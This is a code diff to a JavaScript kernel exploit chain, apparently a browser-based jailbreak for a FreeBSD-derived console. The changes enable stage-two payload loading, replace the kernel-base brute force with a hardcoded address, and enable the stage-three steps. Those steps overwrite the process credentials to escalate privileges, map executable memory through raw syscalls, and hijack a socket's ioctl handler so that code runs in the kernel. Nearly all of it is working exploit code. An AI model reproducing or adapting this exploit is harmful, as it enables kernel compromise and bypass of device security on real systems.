@@ -743,7 +743,7 @@ function stage2() {
     }
   } 
     alert("after stage 3");
-/*	
+	
     var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
     var payload_loader = p.malloc32(0x1000);
 
@@ -820,7 +820,7 @@ function stage2() {
     });
     loader_thr();
     alert("waiting for payload");
-*/  
+  
 }
 
 function stage3() {
@@ -1198,23 +1198,7 @@ function stage3() {
   }
 
   function brute_force_kernel_map() {
-	  /*
-    var attempt = new int64(((leaked_pktopts_address.low & 0xFE000000) + VM_MAP_PMAP_OFFSET), leaked_pktopts_address.hi);
-    for (var i = 0; i < 0xC0; i++) {
-      var kernel_pmap_store = kernel_read8(attempt);
-	  //("attempt: 0x" + kernel_pmap_store);
-      if (kernel_pmap_store.hi == 0xFFFFFFFF && ((kernel_pmap_store.low & 0x3FFF) == (KERNEL_PMAP_STORE_OFFSET & 0x3FFF))) {
-        kernel_base = kernel_pmap_store.sub32(KERNEL_PMAP_STORE_OFFSET);
-        if ((kernel_base.low & 0x3FFF) == 0x0) {
-          return;
-        }
-      }
-      attempt.sub32inplace(0x01000000);
-    }
-    alert("[ERROR] failed to find kernel_map REBOOT");
-    while (1) {};
-	*/
-	kernel_base = new int64(0x80200000, 0xFFFFFFFF);
+	kernel_base = new int64(0x80200000, 0xFFFFFFFF);//static
   }
 
   function find_proc() {
@@ -1256,14 +1240,14 @@ function stage3() {
   const proc = find_proc();
   const proc_ucred = kernel_read8(proc.add32(PROC_UCRED_OFFSET));
   
-  //here we go!
+  alert("here we go!");
   
 
   
-  /*
+
   kernel_write8(proc_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF));
 
-  find_execution_socket();
+  //find_execution_socket();
   var exec_handle = chain.syscall(533, 0, 0x100000, 7);
   var write_handle = chain.syscall(534, exec_handle, 3);
   var write_address = chain.syscall(477, new int64(0x91000000, 0x9), 0x100000, 3, 17, write_handle, 0);
@@ -1383,15 +1367,15 @@ function stage3() {
   p.write8(write_address.add32(0x51), fix_these_sockets_ptr);
 
   p.write8(write_address.add32(0x7B), target_file.add32(FILE_FOPS_OFFSET));
-  p.write8(write_address.add32(0x85), socketops);
+  //p.write8(write_address.add32(0x85), socketops);
   p.write8(write_address.add32(0x92), kernel_base);
 
   p.write8(fake_socketops.add32(FILEOPS_IOCTL_OFFSET), exec_address);
   kernel_write8(target_file.add32(FILE_FOPS_OFFSET), fake_socketops);
   chain.syscall(54, target_socket, 0x20001111, 0);
-  //alert("executed in kernel");
+  alert("executed in kernel");
   //p.write8(0, 0);
-  */
+  
 }
 
 const stack_sz = 0x40000;
